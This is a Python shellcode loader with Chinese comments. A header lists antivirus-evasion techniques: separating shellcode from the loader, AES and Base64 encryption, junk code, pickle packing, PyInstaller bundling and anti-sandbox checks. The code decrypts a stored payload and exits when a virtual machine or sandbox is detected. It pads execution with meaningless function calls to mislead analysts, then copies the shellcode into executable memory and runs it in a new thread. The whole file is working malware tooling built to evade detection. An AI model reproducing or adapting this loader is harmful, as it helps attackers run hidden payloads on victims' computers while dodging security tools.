"""
1、分离 shellcode 和 loader
2、加密 AES + Base64
3、加花
4、序列化/反序列化 pickle
5、进程绑定
6、反编译 pyinstaller -F -w -i icon.ico --key LjjYYDS main.py

反沙箱：
异或反沙箱签名
系统文件、系统名称、CPU个数、物理内存大小、开机时间、鼠标移动间隔

反编译 pyinstxtractor

"""

import random
from datetime import datetime
import time
import string
import requests
import ctypes
import pickle
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.padding import PKCS7
import vm_check
import obfuscation

GetTickCount64 = ctypes.windll.kernel32.GetTickCount64
Sleep = ctypes.windll.kernel32.Sleep


def is_sandbox():
    start_tick = GetTickCount64()
    Sleep(300)  # 暂停300毫秒
    end_tick = GetTickCount64()
    elapsed = end_tick - start_tick
    return elapsed - 300 > 100  # 检查实际暂停时间是否显著小于预期时间


# 从文件中读取密钥和 IV
with open('keywords.txt', 'r') as f:
    key = base64.b64decode(f.readline().strip())
    iv = base64.b64decode(f.readline().strip())

# 从文件中加载加密的 shellcode
with open('encrypted_shellcode.pkl', 'rb') as f:
    B64EnShellcode = pickle.load(f)

# 使用 Base64 解码
encrypted_shellcode = base64.b64decode(B64EnShellcode)

# 使用 AES 解密 shellcode
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
decryptor = cipher.decryptor()
unpadder = PKCS7(algorithms.AES.block_size).unpadder()

decrypted_padded_shellcode = decryptor.update(encrypted_shellcode) + decryptor.finalize()
shellcode = unpadder.update(decrypted_padded_shellcode) + unpadder.finalize()

# 检测虚拟机环境
r = vm_check.numberOfCPU() + vm_check.physicalMemory() + vm_check.check_virtual() + vm_check.check_file()
print(f"VM Check Result: {r}")
if r < 4:  # 判断是否为虚拟机
    print("Virtual machine detected. Exiting.")
    exit()
if is_sandbox():
    print("Sandbox detected. Exiting.")
    exit()
else:
    # 加花
    num_array1 = [random.randint(1, 100) for i in range(100)]
    print(obfuscation.get_grade(85))
    print(obfuscation.calculate_average(obfuscation.num_array))
    print(obfuscation.concatenate_strings("hello", "world"))
    print(obfuscation.is_sorted(obfuscation.num_array))
    print(obfuscation.is_palindrome("radar"))
    print("Running on a physical machine. Executing shellcode.")

    sc = b'\x90' * 16 + shellcode

    # 分配内存并写入 shellcode
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    rusage = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x3000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rusage), ctypes.create_string_buffer(sc), len(sc))
    # 创建线程执行 shellcode
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rusage), 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

    # 加花
    num_array2 = [random.randint(1, 100) for i in range(100)]
    print(obfuscation.get_grade(85))
    print(obfuscation.calculate_average(obfuscation.num_array))
    print(obfuscation.concatenate_strings("hello", "world"))
    print(obfuscation.is_sorted(obfuscation.num_array))
    print(obfuscation.is_palindrome("radar"))
